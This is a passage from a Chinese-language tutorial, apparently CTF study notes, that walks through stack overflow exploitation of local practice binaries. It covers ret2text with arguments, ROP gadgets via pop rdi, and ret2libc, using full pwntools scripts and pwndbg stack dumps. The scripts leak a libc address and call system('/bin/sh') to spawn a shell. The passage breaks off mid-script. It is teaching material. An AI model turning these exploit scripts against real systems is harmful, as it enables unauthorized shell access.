<p>可以看到 <code>03:0018│+008 0x7fffffffdfe8 ◂— 0x6262626262626262 (&#39;bbbbbbbb&#39;)</code> 就已经溢出了， <code>(e8 - e0)</code> 溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────</span><br><span class="line"> ► 0         0x401193 dofunc+50</span><br><span class="line">   1 0x6262626262626262 None</span><br><span class="line">   2   0x7fffffffe00a None</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修改脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x401142</span></span><br><span class="line">payload = flat([cyclic(padding), return_addr])</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fff11b9a6a0 ◂— 0</span><br><span class="line">01:0008│ rsi 0x7fff11b9a6a8 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">02:0010│ rbp 0x7fff11b9a6b0 ◂— 0x6161616461616163 (&#x27;caaadaaa&#x27;)</span><br><span class="line">03:0018│+008 0x7fff11b9a6b8 —▸ 0x401142 (func) ◂— push rbp</span><br><span class="line">04:0020│+010 0x7fff11b9a6c0 —▸ 0x7fff11b9a70a ◂— 0</span><br><span class="line">05:0028│+018 0x7fff11b9a6c8 —▸ 0x790f4362a1ca (__libc_start_call_main+122) ◂— mov edi, eax</span><br><span class="line">06:0030│+020 0x7fff11b9a6d0 —▸ 0x7fff11b9a710 ◂— 0</span><br><span class="line">07:0038│+028 0x7fff11b9a6d8 —▸ 0x7fff11b9a7e8 —▸ 0x7fff11b9c4eb ◂— &#x27;./question_4_1_x64&#x27;</span><br><span class="line">─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────</span><br><span class="line"> ► 0         0x401193 dofunc+50</span><br><span class="line">   1         0x401142 func</span><br><span class="line">   2   0x7fff11b9a70a None</span><br></pre></td></tr></table></figure>
<p>可以看到已经成功溢出了</p>
<h6 id="ret2text-传参-x86"><a href="#ret2text-传参-x86" class="headerlink" title="ret2text 传参 x86"></a>ret2text 传参 x86</h6><ul>
<li>需要了解一个知识，ret后跟的是要调用函数的地址(&amp;func) , 随后+4栈内存跟的是被调用函数中(如果有)的参数<br>我们需要构造成：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp 0xffffcdb0 ◂— 0                                                     ESP</span><br><span class="line">01:0004│-024 0xffffcdb4 —▸ 0xffffcdc8 ◂— &#x27;aaaabbbb\n&#x27;</span><br><span class="line">02:0008│-020 0xffffcdb8 ◂— 0x100</span><br><span class="line">03:000c│-01c 0xffffcdbc —▸ 0x80491b9 (dofunc+12) ◂— add ebx, 0x2e47</span><br><span class="line">04:0010│-018 0xffffcdc0 ◂— 0xffffffff</span><br><span class="line">05:0014│-014 0xffffcdc4 —▸ 0xf7d8396c ◂— 0x914</span><br><span class="line">06:0018│ ecx 0xffffcdc8 ◂— &#x27;aaaabbbb\n&#x27;                                           aaaa</span><br><span class="line">07:001c│-00c 0xffffcdcc ◂— &#x27;bbbb\n&#x27;                                               bbbb</span><br><span class="line">08:0020│-008 0xffffcdd0 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">09:0024│-004 0xffffcdd4 —▸ 0xf7fa2e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;,\r#&#x27; */</span><br><span class="line">0a:0028│ ebp 0xffffcdd8 —▸ 0xffffcde8 ◂— 0</span><br><span class="line">0b:002c│+004 0xffffcddc —▸ 0x8049214 (main+21) ◂— mov eax, 0                      ret后的调用地址 (&amp;func)</span><br><span class="line">0c:0030│+008 0xffffcde0 ◂— 0                                                      执行完func后的返回地址 (很重要！)</span><br><span class="line">... ↓  2 skipped                                                        (如果有,可能)被调用的参数 (search &quot;/bin/sh&quot;)  </span><br><span class="line">                                                                       (如果有,可能)被调用的第二个参数</span><br><span class="line">                                                                                 ......</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">07:001c│-00c 0xffffcdcc ◂— &#x27;aaaa\n&#x27;                                                            </span><br><span class="line">08:0020│-008 0xffffcdd0 ◂— 0xa /* &#x27;\n&#x27; */                                                      </span><br><span class="line">09:0024│-004 0xffffcdd4 —▸ 0xf7fa2e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;,\r#&#x27; */</span><br><span class="line">0a:0028│ ebp 0xffffcdd8 —▸ 0xffffcde8 ◂— 0                                                     </span><br><span class="line">0b:002c│+004 0xffffcddc —▸ 0x8049182 (func) ◂— push ebp            (&amp;func)                            </span><br><span class="line">0c:0030│+008 0xffffcde0 ◂— 0xdeadbeef                              (随便一个return值)                            </span><br><span class="line">0d:0034│+00c 0xffffcde4 —▸ 0x804c024 (sh) ◂— &#x27;/bin/sh&#x27;             (search &quot;/bin/sh&quot; 的内存地址)</span><br></pre></td></tr></table></figure>

<p>要用脚本完成就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_2_x86_new&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>  <span class="comment">#20个&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]  <span class="comment">#取func的地址</span></span><br><span class="line">bin_sh_addr = <span class="number">0x804c018</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(return_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr) </span><br><span class="line"><span class="comment"># payload = flat([cyclic(padding),return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h6 id="ret2text-传参-x64"><a href="#ret2text-传参-x64" class="headerlink" title="ret2text 传参 x64"></a>ret2text 传参 x64</h6><p>x86-64架构寄存器， 传参过程会调用 <code>rdi, rsi, rdc, rcx, r8, r9....</code> 等寄存器，分别为第一个参数，第二个参数…..</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RDI  0x404040 (sh) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */    (设置RDI寄存器为/bin/sh的内存地址)</span><br><span class="line"></span><br><span class="line"> ► 0x401155 &lt;func+19&gt;     call   system@plt                  &lt;system@plt&gt;</span><br><span class="line">        command: 0x404040 (sh) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */                  (可以看到已经成功传参了)</span><br></pre></td></tr></table></figure>

<p><strong>如果要用pwn脚本打，需要理解一些东西：</strong><br>ROP (Return-Oriented Programming) :</p>
<ul>
<li>通过组合程序中已有的代码片段（<code>gadgets</code>）来构造恶意逻辑</li>
<li>每个 <code>gadget</code> 通常以 <code>ret</code> 指令结尾，用于链接多个片段形成攻击链</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary question_4_2_x64_new </span><br></pre></td></tr></table></figure>

<p><strong>之前是通过dbg中的set命令设置的，但是在脚本中，我们要用ROP来构造，所以要改为:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 栈溢出</span><br><span class="line">2 pop rdi; ret  (赋值/bin/sh 给 rdi寄存器)</span><br><span class="line">3 bin_sh_addr </span><br><span class="line">4 func_address  (此时rdi已经被赋值为了/bin/sh的内存地址，直接调用func函数，rdi会被当作第一个参数传入func函数, getshell)</span><br></pre></td></tr></table></figure>

<p>找 <code>pop rdi; ret</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040120b : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>编写脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_2_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x40120b</span></span><br><span class="line">bin_sh_addr = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(return_addr)</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h6 id="ret2libc-x64"><a href="#ret2libc-x64" class="headerlink" title="ret2libc x64"></a>ret2libc x64</h6><p>在程序内没有system函数的时候 ， 只能通过去libc共享库连接文件中去调用 ，怎么知道system的地址呢？<br><strong>泄露程序中已经有调用的函数地址 ， 通过 <code>真实地址 = 基地址 + 偏移地址</code> 的方式计算出system , binsh的地址 ， 然后再去布置栈帧，控制执行流system(“&#x2F;bin&#x2F;sh”)，这就是ret2libc</strong></p>
<ul>
<li>整体思路</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</span><br><span class="line">2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。</span><br><span class="line">3.根据libc库的版本可以很容易的确定puts函数的偏移地址。</span><br><span class="line">4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。</span><br><span class="line">5.根据libc函数的版本，很容易确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 </span><br><span class="line">6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。</span><br><span class="line">7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>基地址 &#x3D; 真实地址  -  偏移地址</strong></p>
</li>
<li><p><strong>0x01 获取基地址, 并求出需要用的函数的地址</strong></p>
</li>
<li><p>rdi , rsi , r15(没用的) 赋值并ret</p>
</li>
<li><p><code>p64(1)</code> 为标准输出, <code>rsi</code> 传入 <code>write@got</code>(要泄漏的地址) , <code>r15</code> 用垃圾值 <code>0xdeadbeef</code> 填充</p>
</li>
<li><p>再调用 <code>p64(write_symbols)</code> 输出, 即可获得实际地址：</p>
</li>
<li><p><code>基地址 = 真实地址 - 偏移地址</code> &#x3D; <code>libc_base = write_addr - libc.sym[&quot;write&quot;]</code></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile) </span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)   <span class="comment"># ldd FILENAME 来查看 （下面获取system..的偏移地址需要用到）</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">leak_write_got = <span class="number">0x404018</span></span><br><span class="line"><span class="comment"># leak_write_got = elf.got[&quot;write&quot;]  也是可以的, 目的是获取write@got</span></span><br><span class="line">write_symbols = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4011fb</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4011f9</span>  <span class="comment">#因为是write(x,x,x) 有三个参数 所以要传入 rdi rsi rdx</span></span><br><span class="line"><span class="comment"># 没有rdx的ROP那就用已经存在的</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(leak_write_got) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(write_symbols)</span><br><span class="line"><span class="comment"># rdi为第一个参数 传入1 标准输出 (0代表标准输入 2错误重定向)</span></span><br><span class="line"><span class="comment"># rsi为第二个参数 传入write@got</span></span><br><span class="line"><span class="comment"># r15没有实际用处，传入junk数据就好</span></span><br><span class="line"><span class="comment"># 最后调用write (write_symbols), 输出write在libc中的真实地址！</span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line">write_addr = u64(io.recv().ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))  <span class="comment"># 处理数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基地址</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]   <span class="comment"># 基地址 = 真实地址 - 偏移地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>得出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write_addr: 0x70300a71c560</span><br><span class="line">libc_base: 0x70300a600000</span><br><span class="line">system: 0x70300a658750</span><br><span class="line">bin_sh: 0x70300a7cb42f</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>0x02 构造最终payload</strong><br>只需要在原来的基础上增加x64位传参的语句就可以了</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile) </span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)   <span class="comment"># ldd FILENAME 来查看 （下面获取system..的偏移地址需要用到）</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">leak_write_got = <span class="number">0x404018</span></span><br><span class="line"><span class="comment"># leak_write_got = elf.got[&quot;write&quot;]  也是可以的, 目的是获取write@got</span></span><br><span class="line">write_symbols = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4011fb</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4011f9</span>  <span class="comment">#因为是write(x,x,x) 有三个参数 所以要传入 rdi rsi rdx</span></span><br><span class="line"><span class="comment"># 没有rdx的ROP那就用已经存在的</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(leak_write_got) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(write_symbols)</span><br><span class="line"><span class="comment"># rdi为第一个参数 传入1 标准输出 (0代表标准输入 2错误重定向)</span></span><br><span class="line"><span class="comment"># rsi为第二个参数 传入write@got</span></span><br><span class="line"><span class="comment"># r15没有实际用处，传入junk数据就好</span></span><br><span class="line"><span class="comment"># 最后调用write (write_symbols), 输出write在libc中的真实地址！</span></span><br><span class="line">payload += p64(return_addr)</span><br><span class="line"><span class="comment"># 重新回到dofunc 函数，为下面最终payload腾空间  </span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line">write_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))  <span class="comment"># 处理数据</span></span><br><span class="line"><span class="comment"># io.recv(6) 代表只接受六位数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基地址</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh/system_addr</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh:&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)  </span><br><span class="line"><span class="comment"># 熟悉的x64传参方式，先传入binsh到rdi, 然后调用system  </span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>栈情况 :</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">02:0010│ rsi 0x7ffd0c5d84b0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">03:0018│ rbp 0x7ffd0c5d84b8 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">04:0020│+008 0x7ffd0c5d84c0 —▸ 0x4011fb (__libc_csu_init+91) ◂— pop rdi</span><br><span class="line">05:0028│+010 0x7ffd0c5d84c8 —▸ 0x72d6259cb42f ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line">06:0030│+018 0x7ffd0c5d84d0 —▸ 0x72d625858750 (system) ◂— endbr64</span><br></pre></td></tr></table></figure>

<h6 id="ret2libc-x86"><a href="#ret2libc-x86" class="headerlink" title="ret2libc x86"></a>ret2libc x86</h6><p>与 ret2libc x64大差不差，步骤还是那几个</p>
<ul>
<li>IDA 或者 gdb 计算溢出大小</li>
<li>溢出后调用程序内的 write, 传参 <code>1</code> 标准输出, <code>write@got</code>, 4字节长度(i386)</li>
<li>通过真实地址和偏移地址计算出基地址</li>
<li>通过基地址和 libc 中的偏移地址计算出实际地址</li>
<li>ret 回 <code>main</code> 函数，重新构造 payload：调用 <code>system</code> 函数，传参 <code>/bin/sh</code><br><strong>需要注意的是传参方式 :</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x64:</span><br><span class="line">rdx overflow</span><br><span class="line">func  (通过寄存器传参: rsi rdi rdx rcx r8 r9 ...)</span><br><span class="line">xxxxxxxxxxxx</span><br><span class="line">_______________________________________________________________________________</span><br><span class="line">x86:</span><br><span class="line">rdx overflow</span><br><span class="line">func</span><br><span class="line">main_ret (or other junk strings)</span><br><span class="line">argc1</span><br><span class="line">argc2</span><br><span class="line">argc3</span><br></pre></td></tr></table></figure>

<p>构造 payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)   <span class="comment"># checksec FILENAME</span></span><br><span class="line"></span><br><span class="line">pwnfile= <span 